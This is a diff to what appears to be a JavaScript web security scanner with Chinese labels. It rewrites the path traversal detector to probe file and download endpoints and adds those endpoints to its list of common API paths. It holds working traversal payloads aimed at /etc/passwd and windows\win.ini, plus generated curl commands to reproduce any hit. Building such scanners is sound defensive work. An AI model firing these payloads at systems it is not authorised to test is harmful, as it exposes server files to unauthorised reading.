@@ -65,6 +65,7 @@ const COMMON_API_PATHS = [
   "/api/projects", "/api/tickets", "/api/invoices",
   "/users", "/orders", "/products", "/posts",
   "/api/profile", "/api/me",
+  "/api/files", "/api/download", "/api/static",
 ];
 const ATTACK_SURFACE_PATHS = [
   "/admin", "/admin/", "/admin/login",
@@ -255,27 +256,32 @@ export async function detectPutIdor(ctx, baseUrl, routes, login) {
 export async function detectPathTraversal(ctx, baseUrl, routes, login) {
   const findings = [];
   const token = login?.identities?.[0]?.token;
-  const payloads = ["../../etc/passwd", "..%2F..%2Fetc%2Fpasswd", "....//....//etc/passwd"];
+  // 常见文件路径模板 + payload
+  const templates = ["/api/files/{p}", "/files/{p}", "/static/{p}", "/download/{p}"];
+  const payloads = ["../../etc/passwd", "..%2F..%2Fetc%2Fpasswd", "..\\..\\windows\\win.ini"];
 
-  for (const route of routes) {
-    if (!route.path.includes("/files") && !route.path.includes("/download") && !route.path.includes("/static")) continue;
-    for (const payload of payloads) {
-      const res = await httpGet(baseUrl, `${route.path}/${payload}`, token);
-      if (res.ok && (res.json?.includes?.("root:") || res.json?.includes?.("[boot loader]"))) {
-        findings.push({
-          type: "路径穿越",
-          method: "GET",
-          path: `${route.path}/${payload}`,
-          severity: "high",
-          detail: `${route.path}/${payload} → 返回文件内容`,
-          curl: `curl ${baseUrl}${route.path}/${payload}`,
-        });
-        ctx.emit?.({
-          kind: "evidence",
-          severity: "error",
-          message: `[路径穿越] ${route.path}/${payload}`,
-        });
-        break;
+  for (const tpl of templates) {
+    for (const p of payloads) {
+      const path = tpl.replace("{p}", p);
+      const res = await httpGet(baseUrl, path, token);
+      if (res.ok && (typeof res.json === "string" || res.json)) {
+        const body = typeof res.json === "string" ? res.json : JSON.stringify(res.json);
+        if (body.includes("root:") || body.includes("[fonts]") || body.includes("[extensions]")) {
+          findings.push({
+            type: "路径穿越",
+            method: "GET",
+            path,
+            severity: "high",
+            detail: `${path} → 返回文件内容（${body.slice(0, 100)}...）`,
+            curl: `curl ${baseUrl}${path}`,
+          });
+          ctx.emit?.({
+            kind: "evidence",
+            severity: "error",
+            message: `[路径穿越] ${path}`,
+          });
+          break;
+        }
       }
     }
   }
